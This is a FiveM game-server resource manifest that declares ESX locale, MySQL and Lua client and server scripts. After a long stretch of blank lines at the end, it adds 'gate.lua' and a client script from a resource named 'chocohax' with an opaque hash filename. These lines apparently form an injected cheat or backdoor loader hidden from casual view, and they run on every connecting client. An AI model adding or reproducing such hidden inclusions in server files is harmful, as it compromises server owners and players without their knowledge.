

resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

client_scripts {
	"@es_extended/locale.lua",
    "clienten.lua",
	'@mysql-async/lib/MySQL.lua'
}

server_scripts {
	"server.lua",
	'@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua'
	
}







client_script 'gate.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'